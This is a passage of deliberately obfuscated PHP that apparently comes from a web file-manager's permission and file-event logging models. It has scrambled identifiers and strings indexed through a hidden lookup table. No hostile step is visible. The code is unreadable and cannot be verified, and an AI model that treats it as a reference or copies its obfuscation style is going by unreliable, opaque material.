$this->groupAuthInfo($Å›³šƒÔ, $Æ·˜Ñ); break; } } if (!$ÔĞÚ©¡Ï || $ÔĞÚ©¡Ï[$ç®ğ¼â[465]] <= 0) { $¡ğñµ¢Æ = $this->authDeepCheck($¤ŞÎÓâÉ[$ç®ğ¼â[181]], $²Ñ¸»§Û); if ($¡ğñµ¢Æ) { $ÔĞÚ©¡Ï = $¡ğñµ¢Æ; } } return $ÔĞÚ©¡Ï; } private function userIsRoot($ÁŠÆù = false) { $º„˜ÂâÒ =& $_SERVER[íû‘ş´]; if (!$ÁŠÆù && _get($GLOBALS, $º„˜ÂâÒ[546])) { return !0; } $›åÅ¯ªÕ = Model($º„˜ÂâÒ[577])->getInfo($ÁŠÆù); $Ê›æ¤†¯ = Model($º„˜ÂâÒ[2104])->listData($›åÅ¯ªÕ[$º„˜ÂâÒ[1577]]); if ($Ê›æ¤†¯ && $Ê›æ¤†¯[$º„˜ÂâÒ[554]][$º„˜ÂâÒ[2105]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ª‘£Û–ê) { $ƒ†¥¸À± =& $_SERVER[íû‘ş´]; $ç§ÁÈÚ® = Model($ƒ†¥¸À±[1390]); $¾«ñ×µ¥ = $ç§ÁÈÚ®->sourceInfo($ª‘£Û–ê); if (!$¾«ñ×µ¥) { return !1; } $ç§ÁÈÚ®->groupPathDisplay($¾«ñ×µ¥); $Ê™õÒğ¬ = array($¾«ñ×µ¥); $Ê™õÒğ¬ = $ç§ÁÈÚ®->_listAppendPath($Ê™õÒğ¬); $¾«ñ×µ¥ = $Ê™õÒğ¬[0]; $’¤”Ü´ = $¾«ñ×µ¥[$ƒ†¥¸À±[561]]; if (isset($¾«ñ×µ¥[$ƒ†¥¸À±[569]])) { $‡é¨”Ù° = explode($ƒ†¥¸À±[8], trim($¾«ñ×µ¥[$ƒ†¥¸À±[561]], $ƒ†¥¸À±[8])); array_shift($‡é¨”Ù°); $’¤”Ü´ = $¾«ñ×µ¥[$ƒ†¥¸À±[567]] . $ƒ†¥¸À±[2106] . implode($ƒ†¥¸À±[8], $‡é¨”Ù°); } return array($ƒ†¥¸À±[471] => $¾«ñ×µ¥[$ƒ†¥¸À±[32]], $ƒ†¥¸À±[84] => KodIO::make($¾«ñ×µ¥[$ƒ†¥¸À±[181]]), $ƒ†¥¸À±[2107] => $’¤”Ü´); } private function groupAuthInfo($øİ²ğ¾˜, $·…Ÿ²Ë) { $âêºÉÂÖ =& $_SERVER[íû‘ş´]; $©ı‘ÓÃ‡ = Model($âêºÉÂÖ[564])->getInfo($·…Ÿ²Ë); return array($âêºÉÂÖ[2108] => intval($øİ²ğ¾˜[$âêºÉÂÖ[464]]), $âêºÉÂÖ[2092] => $øİ²ğ¾˜, $âêºÉÂÖ[2109] => LNG($âêºÉÂÖ[2110]), $âêºÉÂÖ[2101] => array($âêºÉÂÖ[471] => $©ı‘ÓÃ‡[$âêºÉÂÖ[32]], $âêºÉÂÖ[84] => KodIO::make($©ı‘ÓÃ‡[$âêºÉÂÖ[87]][$âêºÉÂÖ[181]]), $âêºÉÂÖ[2107] => $©ı‘ÓÃ‡[$âêºÉÂÖ[568]])); } protected function groupRootAuth($’ğ‡øê¹, $µØù±²ö = false) { $´û–ğ« =& $_SERVER[íû‘ş´]; $µØù±²ö = $µØù±²ö ? $µØù±²ö : USER_ID; $¿Ó™äÜÓ = $µØù±²ö . $´û–ğ«[2111] . $’ğ‡øê¹; static $ŞÔÀ§ÙÓ = array(); if (isset($ŞÔÀ§ÙÓ[$¿Ó™äÜÓ])) { return $ŞÔÀ§ÙÓ[$¿Ó™äÜÓ]; } $½§ŞÌ = Model($´û–ğ«[564])->getInfo($’ğ‡øê¹); $–û’Ì¬¯ = $this->userGroupList($µØù±²ö); $ùåÇ˜¦ = isset($–û’Ì¬¯[$’ğ‡øê¹]) ? $–û’Ì¬¯[$’ğ‡øê¹][$´û–ğ«[464]] : !1; if ($ùåÇ˜¦ && Model($´û–ğ«[550])->authCheckAction($ùåÇ˜¦[$´û–ğ«[464]], $´û–ğ«[1924])) { $ŞÔÀ§ÙÓ[$¿Ó™äÜÓ] = $ùåÇ˜¦; return $ùåÇ˜¦; } $ı¼©ıÍÇ = $this->sourceAuthSelect($½§ŞÌ[$´û–ğ«[87]][$´û–ğ«[181]]); $¤Ç²†½ = $ı¼©ıÍÇ ? $this->authMake($ı¼©ıÍÇ, $µØù±²ö) : !1; $»ğùüÒ = $¤Ç²†½ ? $¤Ç²†½[$´û–ğ«[517]] : !1; $ŞÔÀ§ÙÓ[$¿Ó™äÜÓ] = $»ğùüÒ ? $»ğùüÒ : $ùåÇ˜¦; return $ŞÔÀ§ÙÓ[$¿Ó™äÜÓ]; } public function authOwnerApply($²ã¿ÍüÀ) { $îâë±—» =& $_SERVER[íû‘ş´]; if (empty($²ã¿ÍüÀ[$îâë±—»[464]]) || isset($²ã¿ÍüÀ[$îâë±—»[2112]]) && $²ã¿ÍüÀ[$îâë±—»[2112]]) { return $²ã¿ÍüÀ; } if (AuthModel::authCheckRoot($²ã¿ÍüÀ[$îâë±—»[464]][$îâë±—»[465]])) { return $²ã¿ÍüÀ; } $Õ•¼ñ¾  = Model($îâë±—»[1390])->parentLevelArray($²ã¿ÍüÀ[$îâë±—»[563]]); $Õ•¼ñ¾  = array_merge(array($²ã¿ÍüÀ[$îâë±—»[181]]), array_reverse($Õ•¼ñ¾ )); $›ÉÎíá  = $this->sourceAuthSelect($Õ•¼ñ¾ ); $ë¿¯Ïêµ = array(); $Ô³Êú·º = array(); foreach ($›ÉÎíá  as $òôâÒë => $¹âû„ô) { $€¦ ¨‘æ = $this->authFolderOwnerUser($¹âû„ô); $ë¿¯Ïêµ[$òôâÒë] = $€¦ ¨‘æ; $Ô³Êú·º = array_merge($Ô³Êú·º, $€¦ ¨‘æ[$îâë±—»[640]]); if ($€¦ ¨‘æ[$îâë±—»[2113]]) { break; } } if (count($Ô³Êú·º) == 0) { $Ô³Êú·º = $this->authFolderOwnerGroup($²ã¿ÍüÀ[$îâë±—»[548]]); } $Ô³Êú·º = array_unique($Ô³Êú·º); if (AuthModel::authCheckRoot($²ã¿ÍüÀ[$îâë±—»[464]][$îâë±—»[465]])) { $Ô³Êú·º[] = USER_ID; } $²ã¿ÍüÀ[$îâë±—»[464]][$îâë±—»[2114]] = Model($îâë±—»[556])->userListInfo($Ô³Êú·º); return $²ã¿ÍüÀ; } private function authFolderOwnerGroup($ó’«) { $âèÄïßİ =& $_SERVER[íû‘ş´]; $ç±éè§ = Model($âèÄïßİ[1993])->where(array($âèÄïßİ[1903] => $ó’«))->select(); $­Ÿ«Áİ = array(); if (!$ç±éè§) { return $­Ÿ«Áİ; } foreach ($ç±éè§ as $æƒ«Ûó°) { $ õÖ‹‡Ì = $this->authInfo($æƒ«Ûó°); if (AuthModel::authCheckRoot($ õÖ‹‡Ì[$âèÄïßİ[464]])) { $­Ÿ«Áİ[] = $æƒ«Ûó°[$âèÄïßİ[1705]]; } } return $­Ÿ«Áİ; } private function authFolderOwnerUser($¼ôÈ®Î‚) { $ƒØˆÑ”‚ =& $_SERVER[íû‘ş´]; $´º×®îı = array(); $½¹Í—Ùô = !1; foreach ($¼ôÈ®Î‚ as $ßş’–¸) { $Åœóæó = $this->authInfo($ßş’–¸); if ($ßş’–¸[$ƒØˆÑ”‚[548]] == $ƒØˆÑ”‚[212]) { $½¹Í—Ùô = !0; } if ($ßş’–¸[$ƒØˆÑ”‚[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Åœóæó[$ƒØˆÑ”‚[464]])) { $´º×®îı[] = $ßş’–¸[$ƒØˆÑ”‚[548]]; } } } return array($ƒØˆÑ”‚[640] => $´º×®îı, $ƒØˆÑ”‚[2113] => $½¹Í—Ùô); } public function authMake($ö¬‹ÊÀ, $¡›£ÃÛ¿ = false) { $í§¤­Ğ =& $_SERVER[íû‘ş´]; $ŒÔÈÓÈ’ = $this->authArrayCheck($ö¬‹ÊÀ, $¡›£ÃÛ¿); if ($ŒÔÈÓÈ’[$í§¤­Ğ[2115]]) { $ŒÔÈÓÈ’[$í§¤­Ğ[2115]] = $this->sourceAuthInfo($ŒÔÈÓÈ’[$í§¤­Ğ[2115]]); } return $ŒÔÈÓÈ’; } public function authArrayCheck($óŞ’¯„ä, $Á¯œÒŒ = false) { $€ìûŠ›Ñ =& $_SERVER[íû‘ş´]; if (!$óŞ’¯„ä) { return array($€ìûŠ›Ñ[465] => 0, $€ìûŠ›Ñ[517] => !1); } $Á¯œÒŒ = $Á¯œÒŒ ? $Á¯œÒŒ : USER_ID; $ˆ±í½ŠÍ = 0; $¨Å‘Ğ = 0; $½¤­…Îò = 0; $ÛèÓ‹ˆğ = 0; $­È›ãÎ = 0; $¹’úÉ = 0; $˜òÃ“× = 1000; $îèƒşîõ = 0; $øØÊ÷Ó = 0; $™±”´©’ = 0; $òÆ–ƒù = 0; $ÌŞ’Ã”Ë = array($€ìûŠ›Ñ[181] => 0); foreach ($óŞ’¯„ä as $ÌŞ’Ã”Ë) { $ª—Ÿ´ü = $this->authInfo($ÌŞ’Ã”Ë); if (!$ª—Ÿ´ü) { continue; } $Ÿ™ößÌş = $ÌŞ’Ã”Ë[$€ìûŠ›Ñ[548]]; $¤ØŸÉ¸Õ = intval($ª—Ÿ´ü[$€ìûŠ›Ñ[464]]); if ($ÌŞ’Ã”Ë[$€ìûŠ›Ñ[178]] == SourceModel::TYPE_USER && $Ÿ™ößÌş == $Á¯œÒŒ) { $ˆ±í½ŠÍ = !0; $½¤­…Îò = $ª—Ÿ´ü; $¨Å‘Ğ = $¤ØŸÉ¸Õ; } else { if ($ÌŞ’Ã”Ë[$€ìûŠ›Ñ[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ÿ™ößÌş, $Á¯œÒŒ)) { $ÛèÓ‹ˆğ = !0; $ÕŸ±…¿¹ = $this->groupStepToUserGroup($Ÿ™ößÌş, $Á¯œÒŒ); if ($ÕŸ±…¿¹ < $˜òÃ“×) { $˜òÃ“× = $ÕŸ±…¿¹; $­È›ãÎ = $¤ØŸÉ¸Õ; $¹’úÉ = $ª—Ÿ´ü; $îèƒşîõ = $Ÿ™ößÌş; } if ($ÕŸ±…¿¹ == $˜òÃ“× && $¤ØŸÉ¸Õ >= $­È›ãÎ) { $­È›ãÎ = $¤ØŸÉ¸Õ; $¹’úÉ = $ª—Ÿ´ü; $îèƒşîõ = $Ÿ™ößÌş; } } else { if ($Ÿ™ößÌş == $€ìûŠ›Ñ[212]) { $øØÊ÷Ó = !0; $òÆ–ƒù = $ª—Ÿ´ü; $™±”´©’ = $¤ØŸÉ¸Õ; } } } } if ($ˆ±í½ŠÍ) { $àçäğô‚ = $¨Å‘Ğ; $ª—Ÿ´ü = $½¤­…Îò; $‡•‚’øù = LNG($€ìûŠ›Ñ[2116]); } else { if ($ÛèÓ‹ˆğ) { $àçäğô‚ = $­È›ãÎ; $ª—Ÿ´ü = $¹’úÉ; $”«èÀ¨ = Model($€ìûŠ›Ñ[564])->getInfo($îèƒşîõ); $‡•‚’øù = $€ìûŠ›Ñ[163] . $”«èÀ¨[$€ìûŠ›Ñ[568]] . $€ìûŠ›Ñ[2117] . LNG($€ìûŠ›Ñ[2118]); } else { if ($øØÊ÷Ó) { $àçäğô‚ = $™±”´©’; $ª—Ÿ´ü = $òÆ–ƒù; $‡•‚’øù = LNG($€ìûŠ›Ñ[2089]); } else { $àçäğô‚ = 0; $ª—Ÿ´ü = !1; $‡•‚’øù = $€ìûŠ›Ñ[12]; } } } $ÜŒ¼°ôÚ = array($€ìûŠ›Ñ[2108] => intval($àçäğô‚), $€ìûŠ›Ñ[2092] => $ª—Ÿ´ü, $€ìûŠ›Ñ[2109] => $‡•‚’øù, $€ìûŠ›Ñ[2101] => $ÌŞ’Ã”Ë[$€ìûŠ›Ñ[181]]); return $ÜŒ¼°ôÚ; } private function groupContainUser($Œ¼¸á×ù, $í°©‹× = false) { return in_array($Œ¼¸á×ù, $this->userGroupParents($í°©‹×)); } private function groupStepToUserGroup($‚¬ŸñÀñ, $ûß·ë¯º = false) { $áØöŞå¹ =& $_SERVER[íû‘ş´]; $³Ï•È˜Ã = $this->userGroupList($ûß·ë¯º); $É¬‘è‡ı = 1000; $ŠÀÜ»¹ = $GLOBALS[$áØöŞå¹[6]][$áØöŞå¹[89]][$áØöŞå¹[2006]] == 1; $Ï²¨öÈ± = $ŠÀÜ»¹ ? 3 : 2; foreach ($³Ï•È˜Ã as $ƒÈ¤›®Î) { if ($ƒÈ¤›®Î[$áØöŞå¹[1903]] == $‚¬ŸñÀñ) { return 0; } $Í¯ƒÃ£± = explode($áØöŞå¹[50], trim($ƒÈ¤›®Î[$áØöŞå¹[563]], $áØöŞå¹[50])); if ($Í¯ƒÃ£±[0] == $áØöŞå¹[212] && count($Í¯ƒÃ£±) > $Ï²¨öÈ±) { $Üï³Ç¬£ = array_reverse(array_slice($Í¯ƒÃ£±, $Ï²¨öÈ±)); $å®•Ë˜¾ = array_search($‚¬ŸñÀñ, $Üï³Ç¬£); if ($å®•Ë˜¾ !== !1 && $å®•Ë˜¾ + 1 <= $É¬‘è‡ı) { $É¬‘è‡ı = $å®•Ë˜¾ + 1; } } } return $É¬‘è‡ı; } private function userGroupList($¸³æÇËù = false) { $­Ñ¨µ¼¡ =& $_SERVER[íû‘ş´]; static $•øÂñ»· = array(); if (isset($•øÂñ»·[$¸³æÇËù])) { return $•øÂñ»·[$¸³æÇËù]; } $‘à©Ì»¿ = Model($­Ñ¨µ¼¡[577])->getInfo($¸³æÇËù); $•øÂñ»·[$¸³æÇËù] = array_to_keyvalue($‘à©Ì»¿[$­Ñ¨µ¼¡[2090]], $­Ñ¨µ¼¡[1903]); return $•øÂñ»·[$¸³æÇËù]; } public function userGroupParents($¢ö²æ‹) { $ÌÙÑÈŒÚ =& $_SERVER[íû‘ş´]; static $‰·Èé” = array(); $¢ö²æ‹ = $¢ö²æ‹ ? $¢ö²æ‹ : USER_ID; if (isset($‰·Èé”[$¢ö²æ‹])) { return $‰·Èé”[$¢ö²æ‹]; } $ø¸âŠ = $this->userGroupList($¢ö²æ‹); $¤ú§¶­ = array(); $ÛñşÊ…ä = $GLOBALS[$ÌÙÑÈŒÚ[6]][$ÌÙÑÈŒÚ[89]][$ÌÙÑÈŒÚ[2006]] == 1; $ïÓçÃå = $ÛñşÊ…ä ? 3 : 2; foreach ($ø¸âŠ as $Ëææ°£‰) { $ÏîÜŸï“ = array($Ëææ°£‰[$ÌÙÑÈŒÚ[1903]]); $Ô£°›ß = explode($ÌÙÑÈŒÚ[50], trim($Ëææ°£‰[$ÌÙÑÈŒÚ[563]], $ÌÙÑÈŒÚ[50])); if ($Ô£°›ß[0] == $ÌÙÑÈŒÚ[212] && count($Ô£°›ß) > $ïÓçÃå) { $ˆù¥™µİ = array_slice($Ô£°›ß, $ïÓçÃå); $ÏîÜŸï“ = array_merge($ÏîÜŸï“, array_reverse($ˆù¥™µİ)); } $¤ú§¶­ = array_merge($¤ú§¶­, $ÏîÜŸï“); } $‰·Èé”[$¢ö²æ‹] = array_unique($¤ú§¶­); return $‰·Èé”[$¢ö²æ‹]; } public function authTargetInfoMake($šİû‹°) { $ü¬½ûığ =& $_SERVER[íû‘ş´]; $Ôîª×›’ = array(); $á¼¹€Ø = array(); foreach ($šİû‹° as $æğ…ä‡é) { if ($æğ…ä‡é[$ü¬½ûığ[178]] == SourceModel::TYPE_USER) { $Ôîª×›’[] = intval($æğ…ä‡é[$ü¬½ûığ[548]]); } else { if ($æğ…ä‡é[$ü¬½ûığ[178]] == SourceModel::TYPE_GROUP) { $á¼¹€Ø[] = intval($æğ…ä‡é[$ü¬½ûığ[548]]); } } } if ($Ôîª×›’) { $Ôîª×›’ = Model($ü¬½ûığ[556])->userListInfo($Ôîª×›’); } if ($á¼¹€Ø) { $Š…æå÷é = array($ü¬½ûığ[1991] => array($ü¬½ûığ[469], $á¼¹€Ø)); $á¼¹€Ø = Model($ü¬½ûığ[564])->field($ü¬½ûığ[2119])->where($Š…æå÷é)->select(); $á¼¹€Ø = array_to_keyvalue($á¼¹€Ø, $ü¬½ûığ[1903]); } return array($ü¬½ûığ[2120] => $Ôîª×›’, $ü¬½ûığ[2121] => $á¼¹€Ø); } public function authInfo($Òª½ı—ô) { $ŒÁÄ¢Ğ‚ =& $_SERVER[íû‘ş´]; if ($Òª½ı—ô[$ŒÁÄ¢Ğ‚[2007]]) { $ìñÊëé¦ = Model($ŒÁÄ¢Ğ‚[550])->listData($Òª½ı—ô[$ŒÁÄ¢Ğ‚[2007]]); if (!$ìñÊëé¦) { return !1; $çšï¯Š = Model($ŒÁÄ¢Ğ‚[550])->listData(); $‰˜Ë¿ÔÀ = array_filter_by_field($çšï¯Š, $ŒÁÄ¢Ğ‚[464], $ŒÁÄ¢Ğ‚[212]); return $‰˜Ë¿ÔÀ; } $ñÓ«ù˜‚ = array_field_key($ìñÊëé¦, array($ŒÁÄ¢Ğ‚[443], $ŒÁÄ¢Ğ‚[32], $ŒÁÄ¢Ğ‚[464], $ŒÁÄ¢Ğ‚[1926], $ŒÁÄ¢Ğ‚[1927])); $ñÓ«ù˜‚[$ŒÁÄ¢Ğ‚[2122]] = $Òª½ı—ô; return $ñÓ«ù˜‚; } else { return array($ŒÁÄ¢Ğ‚[470] => 0, $ŒÁÄ¢Ğ‚[1909] => $Òª½ı—ô[$ŒÁÄ¢Ğ‚[2067]], $ŒÁÄ¢Ğ‚[471] => $ŒÁÄ¢Ğ‚[12], $ŒÁÄ¢Ğ‚[1926] => $ŒÁÄ¢Ğ‚[2123]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\145\137\145\x76\145\x6e\164"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\162\x74", "\146\165\156\143\164\x69\x6f\x6e"), array("\x64\x65\163\143", '', "\x69\156\x73\x65\x72\164\54\x75\160\144\141\164\x65\x2c\x73\145\x6c\145\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ã“Û¨ß, $†şóŞ¹, $ı÷íÈøÒ = '') { $Âãª‰Ÿ =& $_SERVER[íû‘ş´]; if (!$this->eventSave) { return; } $˜ØÄø¸Ğ = Model($Âãª‰Ÿ[1390])->sourceInfo($ã“Û¨ß); if (!$˜ØÄø¸Ğ) { return !1; } if ($this->isCacheEvent($˜ØÄø¸Ğ, $†şóŞ¹)) { return; } if ($ı÷íÈøÒ && is_string($ı÷íÈøÒ)) { $ı÷íÈøÒ = array($Âãª‰Ÿ[1942] => $ı÷íÈøÒ); } $«î”˜ = defined($Âãª‰Ÿ[2124]) ? USER_ID : 0; $½²ßœ³® = array($Âãª‰Ÿ[468] => $ã“Û¨ß, $Âãª‰Ÿ[2125] => $˜ØÄø¸Ğ[$Âãª‰Ÿ[180]], $Âãª‰Ÿ[2126] => $˜ØÄø¸Ğ[$Âãª‰Ÿ[32]], $Âãª‰Ÿ[561] => !empty($˜ØÄø¸Ğ[$Âãª‰Ÿ[561]]) ? $˜ØÄø¸Ğ[$Âãª‰Ÿ[561]] : $Âãª‰Ÿ[12], $Âãª‰Ÿ[1696] => $«î”˜, $Âãª‰Ÿ[473] => $†şóŞ¹, $Âãª‰Ÿ[1698] => $ı÷íÈøÒ); $this->addSystemLog($†şóŞ¹, $½²ßœ³®); unset($½²ßœ³®[$Âãª‰Ÿ[2126]], $½²ßœ³®[$Âãª‰Ÿ[561]]); return $this->add($½²ßœ³®); } private function addSystemLog($•ÜŒ¶ŒÌ, $äñˆííÙ) { $âÆò©Û =& $_SERVER[íû‘ş´]; if ($•ÜŒ¶ŒÌ == $âÆò©Û[2127]) { $•ÜŒ¶ŒÌ = $äñˆííÙ[$âÆò©Û[503]][$âÆò©Û[2128]]; } else { if (in_array($•ÜŒ¶ŒÌ, array($âÆò©Û[1883], $âÆò©Û[2129]))) { $•ÜŒ¶ŒÌ = $äñˆííÙ[$âÆò©Û[503]][$âÆò©Û[813]]; } } $‘ĞÂüÄ = array_merge($äñˆííÙ, array($âÆò©Û[2130] => $äñˆííÙ[$âÆò©Û[181]], $âÆò©Û[2131] => $äñˆííÙ[$âÆò©Û[2131]])); Hook::trigger($âÆò©Û[2132], $âÆò©Û[2133] . $•ÜŒ¶ŒÌ, $äñˆííÙ); Model($âÆò©Û[1847])->addLog($âÆò©Û[2133] . $•ÜŒ¶ŒÌ, $‘ĞÂüÄ); } private function isCacheEvent($î¾»ÉîĞ, $ıºæğŸ) { if ($î¾»ÉîĞ[$_SERVER[íû‘ş´][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ËçÑœö¼, $§¿ñ´èê) { $ú’–Ìñ¢ =& $_SERVER[íû‘ş´]; $÷âµ›ôğ = Model($ú’–Ìñ¢[1390])->sourceInfo($ËçÑœö¼); $Äú…Ä«ã = array($ú’–Ìñ¢[2128] => $§¿ñ´èê, $ú’–Ìñ¢[32] => $÷âµ›ôğ[$ú’–Ìñ¢[32]]); return $this->addEvent($ËçÑœö¼, $ú’–Ìñ¢[2127], $Äú…Ä«ã); } public function eventFileEdit($¿¸º³Šó) { $è‚ş‡Ù =& $_SERVER[íû‘ş´]; $ê°í¯Ÿ = array($è‚ş‡Ù[2134] => $_SERVER[$è‚ş‡Ù[2135]], $è‚ş‡Ù[2136] => strtolower(ACTION)); if (isset($GLOBALS[$è‚ş‡Ù[7]][$è‚ş‡Ù[2137]])) { $ê°í¯Ÿ[$è‚ş‡Ù[2137]] = $è‚ş‡Ù[88]; } return $this->addEvent($¿¸º³Šó, $è‚ş‡Ù[1873], $ê°í¯Ÿ); } public function eventRecycle($ù„é“äÂ, $‚óçÀ÷) { return $this->addEvent($ù„é“äÂ, $_SERVER[íû‘ş´][2129], $‚óçÀ÷); } public function eventRemove($î·•æ) { $Ã¸„¼Ç® =& $_SERVER[íû‘ş´]; $Á•ıÆµ† = Model($Ã¸„¼Ç®[1390])->sourceInfo($î·•æ); $í©Œ•ô¿ = $Á•ıÆµ†[$Ã¸„¼Ç®[32]]; return $this->addEvent($Á•ıÆµ†[$Ã¸„¼Ç®[180]], $Ã¸„¼Ç®[1872], $í©Œ•ô¿); } public function eventShare($…‰ÚÕ‘, $Ú¸ø²†Ç) { return $this->addEvent($…‰ÚÕ‘, $_SERVER[íû‘ş´][1883], $Ú¸ø²†Ç); } public function eventMove($µ„Õ»€, $…‡‰´„©, $†£§‡Ï‹) { $’ÓÑ¨Ë· =& $_SERVER[íû‘ş´]; $ÂÏøç®Ğ = Model($’ÓÑ¨Ë·[1390]); $â¤ùÖ–İ = $ÂÏøç®Ğ->sourceInfo($µ„Õ»€); $ê¢‘‘Çå = $ÂÏøç®Ğ->sourceInfo($…‡‰´„©); $û§²¾Úö = $ÂÏøç®Ğ->sourceInfo($†£§‡Ï‹); $Æö¾ËŸ¿ = array($’ÓÑ¨Ë·[1218] => $…‡‰´„©, $’ÓÑ¨Ë·[2138] => $ê¢‘‘Çå[$’ÓÑ¨Ë·[32]], $’ÓÑ¨Ë·[2115] => !empty($ê¢‘‘Çå[$’ÓÑ¨Ë·[561]]) ? $ê¢‘‘Çå[$’ÓÑ¨Ë·[561]] : $’ÓÑ¨Ë·[12], $’ÓÑ¨Ë·[1219] => $†£§‡Ï‹, $’ÓÑ¨Ë·[2139] => $û§²¾Úö[$’ÓÑ¨Ë·[32]], $’ÓÑ¨Ë·[2140] => !empty($û§²¾Úö[$’ÓÑ¨Ë·[561]]) ? $û§²¾Úö[$’ÓÑ¨Ë·[561]] : $’ÓÑ¨Ë·[12]); $this->addEvent($µ„Õ»€, $’ÓÑ¨Ë·[598], $Æö¾ËŸ¿); $â¤ùÖ–İ = $ÂÏøç®Ğ->sourceInfo($µ„Õ»€); $Æö¾ËŸ¿ = array($’ÓÑ¨Ë·[181] => $â¤ùÖ–İ[$’ÓÑ¨Ë·[181]], $’ÓÑ¨Ë·[32] => $â¤ùÖ–İ[$’ÓÑ¨Ë·[32]]); $this->addEvent($…‡‰´„©, $’ÓÑ¨Ë·[2141], $Æö¾ËŸ¿); } public function eventCopy($è•ª˜†) { $this->eventCreate($è•ª˜†, $_SERVER[íû‘ş´][596]); } public function eventRename($ËÄĞ„¡û, $¥ÙÒé„š, $û¨´ª“Ê) { $ù»©¸¤ =& $_SERVER[íû‘ş´]; $µõê¬Ã… = array($ù»©¸¤[1218] => $¥ÙÒé„š, $ù»©¸¤[1219] => $û¨´ª“Ê); return $this->addEvent($ËÄĞ„¡û, $ù»©¸¤[1404], $µõê¬Ã…); } public function eventAddComment($óÖ¿öÌ¾, $€·¶‚«¶) { return $this->addEvent($óÖ¿öÌ¾, $_SERVER[íû‘ş´][2142], $€·¶‚«¶); } public function eventAddDesc($Èù´ƒÇ”, $µ—‚»ª) { return $this->addEvent($Èù´ƒÇ”, $_SERVER[íû‘ş´][2143], $µ—‚»ª); } public function listBySource($Â•ŞÂÑ) { $¡ĞÏı¿ş =& $_SERVER[íû‘ş´]; $§Ğ ù²Ê = Model($¡ĞÏı¿ş[1390])->sourceInfo($Â•ŞÂÑ); $ìÙ¼Àœù = array($¡ĞÏı¿ş[468] => $Â•ŞÂÑ); if ($§Ğ ù²Ê[$¡ĞÏı¿ş[462]] == $¡ĞÏı¿ş[88]) { $ò›Ú×„´ = Model($¡ĞÏı¿ş[1390])->listSearchChildren($Â•ŞÂÑ, 20000); $ò›Ú×„´[] = $Â•ŞÂÑ . $¡ĞÏı¿ş[422]; $ìÙ¼Àœù = array($¡ĞÏı¿ş[181] => array($¡ĞÏı¿ş[7], $ò›Ú×„´)); } $ôÑ–¤á = $this->where($ìÙ¼Àœù)->order($¡ĞÏı¿ş[2144])->selectPage(); if ($ôÑ–¤á[$¡ĞÏı¿ş[410]][$¡ĞÏı¿ş[411]] == 0) { $ôÑ–¤á[$¡ĞÏı¿ş[410]][$¡ĞÏı¿ş[411]] = 1; $ôÑ–¤á[$¡ĞÏı¿ş[413]] = array(array($¡ĞÏı¿ş[468] => $Â•ŞÂÑ, $¡ĞÏı¿ş[2125] => $§Ğ ù²Ê[$¡ĞÏı¿ş[180]], $¡ĞÏı¿ş[1696] => $§Ğ ù²Ê[$¡ĞÏı¿ş[504]], $¡ĞÏı¿ş[473] => $¡ĞÏı¿ş[2145], $¡ĞÏı¿ş[474] => $§Ğ ù²Ê[$¡ĞÏı¿ş[215]], $¡ĞÏı¿ş[1698] => $¡ĞÏı¿ş[12])); } return $this->eventListParse($ôÑ–¤á, $Â•ŞÂÑ); } private function eventListParse($è¶®¥¾à, $©¬¼çñë) { $§ûİ££“ =& $_SERVER[íû‘ş´]; $¾¶Õí‰ó = $è¶®¥¾à[$§ûİ££“[413]]; $Ø«û²ÏÁ = array_to_keyvalue($¾¶Õí‰ó, $§ûİ££“[12], $§ûİ££“[181]); $ìÓÇÕíı = array_to_keyvalue($¾¶Õí‰ó, $§ûİ££“[12], $§ûİ££“[2131]); foreach ($¾¶Õí‰ó as $ÁâßšŒ²) { $ÎÊêíÃ† = $ÁâßšŒ²[$§ûİ££“[503]]; if ($ÁâßšŒ²[$§ûİ££“[33]] == $§ûİ££“[598] && isset($ÎÊêíÃ†[$§ûİ££“[1218]])) { $Ø«û²ÏÁ[] = $ÎÊêíÃ†[$§ûİ££“[1218]] . $§ûİ££“[12]; $Ø«û²ÏÁ[] = $ÎÊêíÃ†[$§ûİ££“[1219]] . $§ûİ££“[12]; } if ($ÁâßšŒ²[$§ûİ££“[33]] == $§ûİ££“[2141] && isset($ÎÊêíÃ†[$§ûİ££“[181]])) { $Ø«û²ÏÁ[] = $ÎÊêíÃ†[$§ûİ££“[181]] . $§ûİ££“[12]; } } $Ø«û²ÏÁ = array_merge($Ø«û²ÏÁ, $ìÓÇÕíı, array($©¬¼çñë . $§ûİ££“[12])); $Ø«û²ÏÁ = array_unique($Ø«û²ÏÁ); $¶ŸÁûäù = array_unique(array_to_keyvalue($¾¶Õí‰ó, $§ûİ££“[12], $§ûİ££“[1705])); $¢Ôä—ÒĞ = Model($§ûİ££“[577])->userListInfo($¶ŸÁûäù); $§Æ¯ñäÑ = Model($§ûİ££“[884])->sourceListInfo($Ø«û²ÏÁ, !0); foreach ($¾¶Õí‰ó as &$ÁâßšŒ²) { if ($ÁâßšŒ²[$§ûİ££“[33]] == $§ûİ££“[598] && isset($ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[1218]])) { $ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[1218]] = $§Æ¯ñäÑ[$ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[1218]]]; $ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[1219]] = $§Æ¯ñäÑ[$ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[1219]]]; } if ($ÁâßšŒ²[$§ûİ££“[33]] == $§ûİ££“[2141] && isset($ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[181]])) { $ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[181]] = $§Æ¯ñäÑ[$ÁâßšŒ²[$§ûİ££“[503]][$§ûİ££“[181]]]; } $ÁâßšŒ²[$§ûİ££“[87]] = $§Æ¯ñäÑ[$ÁâßšŒ²[$§ûİ££“[181]]]; $ÁâßšŒ²[$§ûİ££“[2146]] = $§Æ¯ñäÑ[$ÁâßšŒ²[$§ûİ££“[2131]]]; if ($ÁâßšŒ²[$§ûİ££“[33]] == $§ûİ££“[1872]) { $ÁâßšŒ²[$§ûİ££“[2146]] = 